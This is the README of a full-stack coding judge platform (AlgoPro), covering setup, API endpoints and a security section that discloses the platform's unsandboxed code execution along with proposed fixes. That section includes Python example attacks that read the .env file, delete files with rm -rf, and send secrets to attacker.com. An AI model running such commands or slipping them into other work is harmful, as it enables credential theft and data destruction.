# AlgoPro - Online Coding Judge Platform

A full-stack online coding judge platform for practicing Data Structures and Algorithms problems, featuring 75 problems from the Blind 75 list.

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Tech Stack](#tech-stack)
- [Project Structure](#project-structure)
- [Setup Instructions](#setup-instructions)
- [Security Considerations](#security-considerations)
- [API Documentation](#api-documentation)
- [Development](#development)
- [Known Issues](#known-issues)

---

## 🎯 Overview

AlgoPro is a coding practice platform designed for technical interview preparation. It includes:
- **75 DSA problems** organized into 18 test suites (3 problems each)
- **Multi-language support**: Python, JavaScript, Java, C++
- **Real-time code execution** with test case validation
- **Progress tracking** with completion percentage, streaks, and time spent
- **Professional UI** with instructions modal and responsive design

**Current Status**: ✅ Fully functional for local development
**Production Ready**: ⚠️ NO - See [Security Considerations](#security-considerations)

---

## ✨ Features

### 1. Code Execution Engine
- Supports Python, JavaScript, Java, C++
- 10-second timeout per execution
- Custom input testing
- Automated test case validation
- Intelligent output normalization

### 2. Problem Management
- 75 problems from Blind 75 list
- 18 test suites with mixed topics
- Detailed problem descriptions
- Constraints and examples
- Multiple test cases per problem

### 3. User Interface
- **Dashboard**: Test cards with progress stats
- **Instructions Modal**: Centered, concise rules screen
- **Code Editor**: Syntax highlighting, multi-language
- **Resizable Console**: Drag-to-resize output panel (100px-500px)
- **Q1, Q2, Q3 Navigation**: Switch between problems with visual states

### 4. Progress Tracking
- Completion percentage (solved/total)
- Day streak counter
- Time spent tracking
- Auto-save on problem switch
- Real-time updates every 30 seconds

### 5. Security Features
- Copy-paste prevention (external sources only)
- Input validation
- Timeout protection
- Temp file isolation

---

## 🛠️ Tech Stack

### Backend
- **Runtime**: Node.js
- **Framework**: Express.js
- **Storage**: JSON file (Supabase optional)
- **Code Execution**: Child processes with timeout
- **Dependencies**: 
  - `express` - Web framework
  - `cors` - Cross-origin resource sharing
  - `uuid` - Unique file naming
  - `dotenv` - Environment variables
  - `@supabase/supabase-js` - Database (optional)

### Frontend
- **Framework**: React 18
- **Build Tool**: Vite
- **Styling**: Custom CSS
- **State Management**: React Hooks
- **HTTP Client**: Fetch API

---

## 📁 Project Structure

```
algopro/
├── backend/
│   ├── src/
│   │   ├── app.js                    # Main server
│   │   ├── config/
│   │   │   └── supabase.js           # Supabase config (optional)
│   │   ├── models/
│   │   │   ├── UserProgress.js       # Supabase model
│   │   │   └── UserProgressFile.js   # File-based model (active)
│   │   ├── routes/
│   │   │   ├── codeRoutes.js         # Code execution endpoints
│   │   │   └── progressRoutes.js     # Progress tracking endpoints
│   │   ├── services/
│   │   │   └── codeExecutor.js       # Code execution engine
│   │   └── data/
│   │       └── problems.js           # 75 problems data
│   ├── temp/                         # Temporary code files
│   ├── data/
│   │   └── user-progress.json        # Progress storage
│   ├── .env                          # Environment variables
│   ├── .gitignore
│   └── package.json
│
├── frontend/
│   ├── src/
│   │   ├── App.jsx                   # Main app + routing
│   │   ├── App.css                   # All styles
│   │   ├── pages/
│   │   │   ├── Dashboard.jsx         # Test cards + stats
│   │   │   ├── ProblemView.jsx       # Code editor + console
│   │   │   └── TestInstructions.jsx  # Instructions modal
│   │   ├── components/
│   │   │   └── TestCard.jsx          # Test card component
│   │   ├── services/
│   │   │   └── api.js                # API calls
│   │   └── data/
│   │       ├── problems.js           # 75 problems
│   │       └── testSuites.js         # 18 test suites
│   ├── .gitignore
│   └── package.json
│
└── README.md
```

---

## 🚀 Setup Instructions

### Prerequisites
- Node.js (v16 or higher)
- npm or yarn
- Python (for Python code execution)
- Java JDK (for Java code execution)
- g++ (for C++ code execution)

### Backend Setup

1. **Navigate to backend directory**
```bash
cd backend
```

2. **Install dependencies**
```bash
npm install
```

3. **Create .env file**
```bash
# backend/.env
PORT=5000
NODE_ENV=development

# Optional: Supabase credentials (if using database)
SUPABASE_URL=your_supabase_url
SUPABASE_ANON_KEY=your_supabase_anon_key
```

4. **Start development server**
```bash
npm run dev
```

Backend will run on `http://localhost:5000`

### Frontend Setup

1. **Navigate to frontend directory**
```bash
cd frontend
```

2. **Install dependencies**
```bash
npm install
```

3. **Create .env file (optional)**
```bash
# frontend/.env
VITE_API_URL=http://localhost:5000/api
```

4. **Start development server**
```bash
npm run dev
```

Frontend will run on `http://localhost:5174`

### Verify Installation

1. Open `http://localhost:5174` in your browser
2. Click any test card
3. See instructions modal
4. Click "Yes, Start Test"
5. Write code and test execution

---

## 🔒 Security Considerations

### ⚠️ CRITICAL: NOT PRODUCTION READY

**Security Score: 18/100** 🔴

This application has **critical security vulnerabilities** and should **NOT** be deployed publicly without addressing the following issues:

### Critical Vulnerabilities

#### 1. Arbitrary Code Execution (CRITICAL)
**Issue**: User code runs directly on the server without sandboxing.

**Risks**:
- Complete server compromise
- File system access (read/write/delete)
- Network access and data exfiltration
- System command execution
- Malware installation

**Example Attack**:
```python
# Python - Read sensitive files
import os
print(open('backend/.env').read())

# Python - Delete files
os.system('rm -rf /important/files')

# Python - Network exfiltration
import urllib.request
data = open('.env').read()
urllib.request.urlopen('http://attacker.com/?data=' + data)
```

**Solution**: Implement Docker containers for code isolation
```javascript
// Use Docker to isolate execution
const dockerCmd = `docker run --rm --network=none --memory=256m \\
  -v /tmp/code:/code:ro \\
  ${languageImage} timeout 10s ${runCommand}`;
```

#### 2. No Rate Limiting (CRITICAL)
**Issue**: No limits on API requests.

**Risks**:
- DoS attacks
- Resource exhaustion
- Cost explosion

**Solution**: Add express-rate-limit
```bash
npm install express-rate-limit
```

```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // 100 requests per window
});

app.use('/api', limiter);
```

#### 3. No Authentication (HIGH)
**Issue**: All endpoints are publicly accessible.

**Risks**:
- Unauthorized access
- Progress manipulation
- Resource abuse

**Solution**: Implement JWT authentication
```javascript
const jwt = require('jsonwebtoken');

const authMiddleware = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.userId = decoded.userId;
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
};
```

#### 4. CORS Allows All Origins (MEDIUM)
**Issue**: Any website can call your API.

**Solution**: Restrict to your frontend
```javascript
app.use(cors({
  origin: process.env.FRONTEND_URL || 'http://localhost:5174',
  credentials: true
}));
```

#### 5. No Input Validation (HIGH)
**Issue**: Code size, language, and input not validated.

**Solution**: Add validation
```javascript
const MAX_CODE_LENGTH = 50000;
const ALLOWED_LANGUAGES = ['python', 'javascript', 'java8', 'cpp'];

if (!ALLOWED_LANGUAGES.includes(language)) {
  return res.status(400).json({ error: 'Invalid language' });
}

if (code.length > MAX_CODE_LENGTH) {
  return res.status(400).json({ error: 'Code too large' });
}
```

### Quick Security Fixes (30 minutes)

1. **Add rate limiting** (5 min)
2. **Restrict CORS** (2 min)
3. **Add input validation** (10 min)
4. **Add security headers** (2 min)
5. **Improve error handling** (5 min)

### Before Production Deployment

- [ ] Implement Docker sandboxing for code execution
- [ ] Add authentication (JWT or OAuth)
- [ ] Add rate limiting
- [ ] Restrict CORS
- [ ] Add comprehensive input validation
- [ ] Implement HTTPS
- [ ] Add logging and monitoring
- [ ] Security audit by professional
- [ ] Penetration testing
- [ ] Add WAF (Web Application Firewall)

### Safe Usage

**Currently safe for**:
- ✅ Local development
- ✅ Learning and practice
- ✅ Single-user testing

**NOT safe for**:
- ❌ Public deployment
- ❌ Multiple users
- ❌ Production use
- ❌ Untrusted users

---

## 📡 API Documentation

### Base URL
```
http://localhost:5000/api
```

### Endpoints

#### Code Execution

**Run Code**
```http
POST /api/run
Content-Type: application/json

{
  "code": "print('Hello, World!')",
  "language": "python",
  "input": ""
}

Response:
{
  "success": true,
  "output": "Hello, World!\n",
  "error": null
}
```

**Submit Code**
```http
POST /api/submit
Content-Type: application/json

{
  "code": "def twoSum(nums, target): ...",
  "language": "python",
  "problemId": 1
}

Response:
{
  "success": true,
  "allPassed": true,
  "passedCount": 3,
  "totalCount": 3,
  "results": [...]
}
```

**Get All Problems**
```http
GET /api/problems

Response:
{
  "success": true,
  "problems": [...]
}
```

**Get Specific Problem**
```http
GET /api/problems/:id

Response:
{
  "success": true,
  "problem": {...}
}
```

#### Progress Tracking

**Get Progress**
```http
GET /api/progress

Response:
{
  "success": true,
  "progress": {
    "userId": "user_001",
    "solvedProblems": [],
    "totalProblems": 75,
    "completionPercentage": 0,
    "streak": 0,
    "timeSpent": "0.0h"
  }
}
```

**Mark Problem Solved**
```http
POST /api/progress/solve
Content-Type: application/json

{
  "problemId": 1
}

Response:
{
  "success": true,
  "progress": {...}
}
```

**Start Session**
```http
POST /api/progress/start-session

Response:
{
  "success": true,
  "startTime": 1234567890
}
```

**Update Time Spent**
```http
POST /api/progress/update-time

Response:
{
  "success": true,
  "progress": {...}
}
```

**Reset Progress**
```http
POST /api/progress/reset

Response:
{
  "success": true,
  "progress": {...}
}
```

---

## 💻 Development

### Running Tests

**Backend**
```bash
cd backend
node test-simple.js        # Simple execution test
node test-judge.js          # Judge system test
node test-output-matching.js # Output matching test
```

**Frontend**
```bash
cd frontend
npm run build              # Production build
npm run preview            # Preview production build
```

### Code Execution Flow

1. User writes code in editor
2. Frontend sends code to `/api/run` or `/api/submit`
3. Backend validates input
4. Code is written to temp file with UUID
5. Code is compiled (if needed)
6. Code is executed with timeout
7. Output is captured and normalized
8. Temp files are cleaned up
9. Result is returned to frontend

### Adding New Problems

Edit `backend/src/data/problems.js` and `frontend/src/data/problems.js`:

```javascript
{
  id: 76,
  title: "New Problem",
  difficulty: "Medium",
  category: "Array",
  description: "Problem description...",
  examples: [...],
  constraints: [...],
  testCases: [
    { input: "...", output: "..." }
  ],
  starterCode: {
    python: "def solution():\n    pass",
    javascript: "function solution() {\n    \n}",
    java8: "class Solution {\n    \n}",
    cpp: "class Solution {\n    \n};"
  }
}
```

### Environment Variables

**Backend (.env)**
```env
PORT=5000
NODE_ENV=development
FRONTEND_URL=http://localhost:5174

# Optional: Supabase
SUPABASE_URL=your_url
SUPABASE_ANON_KEY=your_key
```

**Frontend (.env)**
```env
VITE_API_URL=http://localhost:5000/api
```

---

## 🐛 Known Issues

### 1. Code Execution Security
- **Issue**: No sandboxing
- **Impact**: Security risk
- **Workaround**: Only use locally with trusted code
- **Fix**: Implement Docker containers

### 2. Single User Only
- **Issue**: File-based storage supports one user
- **Impact**: Can't handle multiple users
- **Workaround**: Use for single-user practice
- **Fix**: Migrate to Supabase database

### 3. No Authentication
- **Issue**: All endpoints are public
- **Impact**: Anyone can access
- **Workaround**: Use only locally
- **Fix**: Implement JWT authentication

### 4. Windows Path Issues
- **Issue**: Temp file paths may have issues on Windows
- **Impact**: Code execution may fail
- **Workaround**: Use WSL or adjust paths
- **Fix**: Use path.join() consistently

### 5. Language Dependencies
- **Issue**: Requires Python, Java, g++ installed
- **Impact**: Some languages won't work without them
- **Workaround**: Install required compilers
- **Fix**: Use Docker with pre-installed languages

---

## 📝 License

This project is for educational purposes.

---

## 🤝 Contributing

This is a learning project. For production use, address security issues first.

---

## 📞 Support

For issues or questions:
1. Check this README
2. Review code comments
3. Check browser console for errors
4. Check backend logs

---

## ⚠️ Important Notes

1. **Security**: This application has critical security vulnerabilities. Do NOT deploy publicly without fixes.

2. **Credentials**: Never commit `.env` files or share Supabase credentials.

3. **Storage**: Currently uses file-based storage (single user). Migrate to Supabase for multi-user support.

4. **Code Execution**: User code runs on your server. Only use with trusted code or implement Docker sandboxing.

5. **Rate Limiting**: No rate limiting implemented. Add before any public deployment.

6. **HTTPS**: Use HTTPS in production. Current setup uses HTTP.

7. **Error Handling**: Error messages may leak internal details. Improve before production.

8. **Monitoring**: No logging or monitoring. Add for production use.

---

## 🎯 Roadmap

### Phase 1: Security (Required for Production)
- [ ] Docker sandboxing for code execution
- [ ] JWT authentication
- [ ] Rate limiting
- [ ] Input validation
- [ ] HTTPS setup
- [ ] Security audit

### Phase 2: Features
- [ ] User registration/login
- [ ] Leaderboard
- [ ] Discussion forum
- [ ] Solution explanations
- [ ] Video tutorials
- [ ] Contest mode

### Phase 3: Scaling
- [ ] Database migration (Supabase)
- [ ] Caching (Redis)
- [ ] Load balancing
- [ ] CDN for static assets
- [ ] Monitoring and alerts

---

## 📊 Current Status

**Version**: 1.0.0
**Status**: Development
**Security**: ⚠️ Not production ready
**Features**: ✅ All implemented
**Testing**: ✅ Locally tested

**Last Updated**: April 28, 2026

---

**Built with ❤️ for learning and practice**
